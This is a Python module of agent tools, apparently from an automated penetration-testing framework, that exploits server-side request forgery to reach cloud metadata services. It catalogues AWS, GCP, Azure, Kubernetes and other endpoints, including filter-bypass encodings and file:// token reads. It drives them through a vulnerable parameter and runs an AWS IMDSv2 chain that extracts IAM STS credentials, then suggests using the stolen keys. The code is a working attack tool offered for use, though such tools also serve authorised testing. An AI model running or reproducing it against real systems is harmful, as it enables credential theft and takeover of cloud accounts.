"""
SSRF cloud-metadata exploitation catalogue.

Given a confirmed SSRF primitive (a vulnerable URL parameter), this module
walks the standard metadata endpoints for AWS (IMDSv1 + IMDSv2 token flow),
GCP, Azure, DigitalOcean, Alibaba, Oracle, IBM, Hetzner, Equinix Metal, and
Kubernetes service-account tokens.

Two entrypoints:
  - ssrf_cloud_metadata(target_url, ssrf_param, provider="auto")
        Drives the SSRF parameter through each provider's endpoint chain.
  - ssrf_imdsv2_chain(target_url, ssrf_param, region="us-east-1")
        Full IMDSv2 dance: PUT-token (via SSRF) → GET-creds (via SSRF) → return STS keys.

Both return structured findings the agent can publish to the bus.
"""

from __future__ import annotations

import json
import re
import urllib.parse

import requests

from src.sdk.tool import function_tool


# ─────────────────────────────────────────────────────────────────────────────
# Catalogue of cloud metadata endpoints (no creds, no key required)
# ─────────────────────────────────────────────────────────────────────────────

PROVIDER_ENDPOINTS: dict[str, list[dict]] = {
    "aws": [
        {"url": "http://169.254.169.254/latest/meta-data/", "headers": {}, "label": "IMDSv1 root"},
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "headers": {}, "label": "IMDSv1 IAM"},
        {"url": "http://169.254.169.254/latest/user-data", "headers": {}, "label": "IMDSv1 user-data"},
        # Many SSRF filters block 169.254.169.254 literal — try alternate decimal/octal/hex encodings:
        {"url": "http://[fd00:ec2::254]/latest/meta-data/", "headers": {}, "label": "IMDS v6"},
        {"url": "http://2852039166/latest/meta-data/", "headers": {}, "label": "IMDS decimal"},
        {"url": "http://0xa9fea9fe/latest/meta-data/", "headers": {}, "label": "IMDS hex"},
        {"url": "http://0251.0376.0251.0376/latest/meta-data/", "headers": {}, "label": "IMDS octal"},
        {"url": "http://169.254.169.254.nip.io/latest/meta-data/", "headers": {}, "label": "IMDS DNS rebind"},
    ],
    "gcp": [
        {"url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json",
         "headers": {"Metadata-Flavor": "Google"}, "label": "GCP recursive"},
        {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "headers": {"Metadata-Flavor": "Google"}, "label": "GCP SA token"},
        {"url": "http://169.254.169.254/computeMetadata/v1/?recursive=true",
         "headers": {"Metadata-Flavor": "Google"}, "label": "GCP IP-only"},
    ],
    "azure": [
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-12-13",
         "headers": {"Metadata": "true"}, "label": "Azure IMDS"},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         "headers": {"Metadata": "true"}, "label": "Azure managed identity → ARM token"},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
         "headers": {"Metadata": "true"}, "label": "Azure managed identity → Key Vault"},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
         "headers": {"Metadata": "true"}, "label": "Azure managed identity → Storage"},
    ],
    "digitalocean": [
        {"url": "http://169.254.169.254/metadata/v1.json", "headers": {}, "label": "DO metadata"},
    ],
    "alibaba": [
        {"url": "http://100.100.100.200/latest/meta-data/", "headers": {}, "label": "Aliyun ECS"},
        {"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "headers": {}, "label": "Aliyun RAM creds"},
    ],
    "oracle": [
        {"url": "http://169.254.169.254/opc/v2/instance/", "headers": {"Authorization": "Bearer Oracle"}, "label": "OCI v2 instance"},
        {"url": "http://169.254.169.254/opc/v2/identity/cert.pem", "headers": {"Authorization": "Bearer Oracle"}, "label": "OCI identity cert"},
    ],
    "ibm": [
        {"url": "http://169.254.169.254/metadata/v1/instance", "headers": {"Accept": "application/json"}, "label": "IBM Cloud"},
    ],
    "hetzner": [
        {"url": "http://169.254.169.254/hetzner/v1/metadata", "headers": {}, "label": "Hetzner metadata"},
    ],
    "equinix": [
        {"url": "https://metadata.platformequinix.com/metadata", "headers": {}, "label": "Equinix Metal"},
    ],
    "kubernetes": [
        {"url": "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts", "headers": {}, "label": "K8s API"},
        {"url": "file:///var/run/secrets/kubernetes.io/serviceaccount/token", "headers": {}, "label": "K8s SA token (LFI)"},
        {"url": "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "headers": {}, "label": "K8s CA (LFI)"},
    ],
}


def _drive_ssrf(target_url: str, ssrf_param: str, payload_url: str,
                method: str, headers: dict, base_headers: dict, timeout: int = 10):
    """Send the target SSRF request with our metadata payload as the parameter value."""
    parsed = urllib.parse.urlparse(target_url)
    qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))

    request_headers = {**base_headers, **headers}

    if method.upper() == "GET":
        qs[ssrf_param] = payload_url
        new_url = parsed._replace(query=urllib.parse.urlencode(qs)).geturl()
        try:
            return requests.get(new_url, headers=request_headers, timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            return None
    else:
        body = {ssrf_param: payload_url}
        try:
            return requests.post(target_url, headers=request_headers, json=body,
                                 timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            try:
                return requests.post(target_url, headers=request_headers, data=body,
                                     timeout=timeout, verify=False, allow_redirects=False)
            except Exception:
                return None


def _looks_like_metadata_response(text: str, provider: str) -> bool:
    """Heuristic — does the SSRF echo back the metadata response?"""
    if not text:
        return False
    t = text.lower()
    markers = {
        "aws": ["accesskeyid", "ami-id", "instance-id", "iam/", "security-credentials", "userdata"],
        "gcp": ["computemetadata", "service-accounts", "access_token", "project-id", "instance/"],
        "azure": ["compute", "vmid", "subscriptionid", "access_token", "client_id"],
        "digitalocean": ["droplet_id", "hostname", "interfaces"],
        "alibaba": ["instance-id", "owner-account-id", "ram/security-credentials"],
        "oracle": ["compartmentid", "ociid", "displayname"],
        "ibm": ["instance_id", "vpc_id"],
        "hetzner": ["hostname", "instance-id"],
        "equinix": ["device_id", "facility"],
        "kubernetes": ["serviceaccount", "kind:", "apiversion"],
    }
    for needle in markers.get(provider, []):
        if needle in t:
            return True
    return False


@function_tool()
def ssrf_cloud_metadata(
    target_url: str,
    ssrf_param: str,
    provider: str = "auto",
    method: str = "GET",
    base_headers: str = "{}",
) -> str:
    """
    Drive a confirmed SSRF primitive against every cloud-provider metadata
    catalog and report which endpoints are reachable.

    Args:
        target_url:   Vulnerable target URL (e.g. https://app.example.com/fetch?url=)
        ssrf_param:   Parameter name controlling the SSRF (e.g. 'url', 'image', 'callback')
        provider:     auto | aws | gcp | azure | digitalocean | alibaba | oracle | ibm | hetzner | equinix | kubernetes | all
        method:       HTTP method to send to target_url (GET or POST)
        base_headers: JSON string of session headers (cookies/auth)

    Returns:
        Hits per provider with the leaked metadata snippet.
    """
    try:
        bhdrs = json.loads(base_headers) if base_headers else {}
    except Exception:
        bhdrs = {}

    if provider == "all" or provider == "auto":
        providers = list(PROVIDER_ENDPOINTS.keys())
    else:
        if provider not in PROVIDER_ENDPOINTS:
            return f"Error: unknown provider '{provider}'. Valid: {', '.join(PROVIDER_ENDPOINTS)}"
        providers = [provider]

    out = [f"## SSRF Cloud Metadata: {target_url} (param={ssrf_param})"]
    hits = []

    for prov in providers:
        out.append(f"\n=== {prov.upper()} ===")
        for endpoint in PROVIDER_ENDPOINTS[prov]:
            r = _drive_ssrf(target_url, ssrf_param, endpoint["url"], method,
                            endpoint.get("headers", {}), bhdrs, timeout=10)
            if r is None:
                out.append(f"  [{endpoint['label']}]  conn-error")
                continue
            body = r.text or ""
            looks_legit = _looks_like_metadata_response(body, prov)
            if r.status_code in (200, 401, 403) and looks_legit:
                hits.append((prov, endpoint["label"], endpoint["url"], r.status_code, body[:300]))
                out.append(f"  [{endpoint['label']}]  HTTP {r.status_code}  ✓ METADATA LEAK")
                out.append(f"      → {body[:200]!r}")
            elif r.status_code == 200 and len(body) > 0:
                out.append(f"  [{endpoint['label']}]  HTTP 200 ({len(body)}B) — verify manually")
            else:
                out.append(f"  [{endpoint['label']}]  HTTP {r.status_code}")

    out.append("\n" + "=" * 60)
    if hits:
        out.append(f"⚠️  CONFIRMED SSRF → CLOUD METADATA: {len(hits)} endpoint(s) leaking")
        for prov, label, url, sc, snip in hits:
            out.append(f"  ✗ [{prov}] {label} — {url}")
        out.append("\n[Next]")
        if any(p == "aws" for p, *_ in hits):
            out.append("  - ssrf_imdsv2_chain(target_url, ssrf_param) to extract STS creds")
        if any(p == "azure" for p, *_ in hits):
            out.append("  - Re-fetch with resource=https://graph.microsoft.com/ for Graph token")
        if any(p == "gcp" for p, *_ in hits):
            out.append("  - Hit /service-accounts/default/token for SA bearer")
        if any(p == "kubernetes" for p, *_ in hits):
            out.append("  - Use the SA token to query the apiserver")
    else:
        out.append("No metadata endpoints leaked — try IMDSv2 token flow or alternative encodings.")
    return "\n".join(out)


@function_tool()
def ssrf_imdsv2_chain(
    target_url: str,
    ssrf_param: str,
    base_headers: str = "{}",
    method: str = "GET",
) -> str:
    """
    AWS IMDSv2 token-flow exploitation. Many SSRFs only support GET; this still
    works as long as the target supports custom HTTP methods OR the SSRF is in
    a parameter passed into a curl/wget that accepts -X/--method.

    Args:
        target_url:   Vulnerable URL with the SSRF param
        ssrf_param:   Parameter name carrying the SSRF target
        base_headers: JSON of session headers
        method:       Underlying HTTP method to target_url

    Returns:
        Extracted STS credentials (AccessKeyId, SecretAccessKey, SessionToken)
        if successful.
    """
    try:
        bhdrs = json.loads(base_headers) if base_headers else {}
    except Exception:
        bhdrs = {}

    out = [f"## IMDSv2 chain via SSRF: {target_url}"]

    # Step 1: PUT to /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds: 21600
    # Most SSRFs cannot send PUT — try several bypasses:
    token_url = "http://169.254.169.254/latest/api/token"
    headers_for_put = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}

    # Try various encodings the SSRF might accept (some auto-decode #, ?, etc.)
    candidate_token_urls = [
        token_url,
        "http://169.254.169.254/latest/api/token#",
        "http://169.254.169.254:80/latest/api/token",
        "http://[::ffff:169.254.169.254]/latest/api/token",
    ]

    token = None
    for url in candidate_token_urls:
        r = _drive_ssrf(target_url, ssrf_param, url, method, headers_for_put, bhdrs, timeout=8)
        if r is None:
            continue
        body = (r.text or "").strip()
        # IMDS tokens are 20-100+ printable chars
        if r.status_code == 200 and 20 <= len(body) <= 256 and re.fullmatch(r"[A-Za-z0-9+/=_\-]+", body):
            token = body
            out.append(f"  [+] Got IMDSv2 token via {url}: {token[:24]}…")
            break
        else:
            out.append(f"  [-] {url}  HTTP {r.status_code}, body={body[:60]!r}")

    if not token:
        out.append("\n[FAIL] Could not obtain IMDSv2 token. Falling back to IMDSv1 (try ssrf_cloud_metadata).")
        return "\n".join(out)

    # Step 2: list IAM roles
    role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    auth_headers = {"X-aws-ec2-metadata-token": token}
    r = _drive_ssrf(target_url, ssrf_param, role_url, method, auth_headers, bhdrs, timeout=8)
    if not r or r.status_code != 200:
        out.append(f"\n[FAIL] Could not list IAM roles: HTTP {getattr(r, 'status_code', '?')}")
        return "\n".join(out)

    role = (r.text or "").strip().splitlines()[0].strip()
    if not role:
        out.append("\n[FAIL] No IAM role attached to the instance.")
        return "\n".join(out)

    out.append(f"  [+] IAM role: {role}")

    # Step 3: pull STS credentials
    cred_url = role_url + role
    r = _drive_ssrf(target_url, ssrf_param, cred_url, method, auth_headers, bhdrs, timeout=8)
    if not r or r.status_code != 200:
        out.append(f"\n[FAIL] Could not fetch creds for role {role}")
        return "\n".join(out)

    try:
        creds = json.loads(r.text)
    except Exception:
        out.append("\n[FAIL] Cred response was not JSON")
        out.append(r.text[:400])
        return "\n".join(out)

    out.append("\n[+] STS Credentials extracted:")
    out.append(f"      AccessKeyId:     {creds.get('AccessKeyId')}")
    out.append(f"      SecretAccessKey: {(creds.get('SecretAccessKey') or '')[:20]}…")
    out.append(f"      SessionToken:    {(creds.get('Token') or '')[:40]}…")
    out.append(f"      Expiration:      {creds.get('Expiration')}")
    out.append("\n[Next]  AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY/AWS_SESSION_TOKEN env vars set + aws sts get-caller-identity")
    return "\n".join(out)
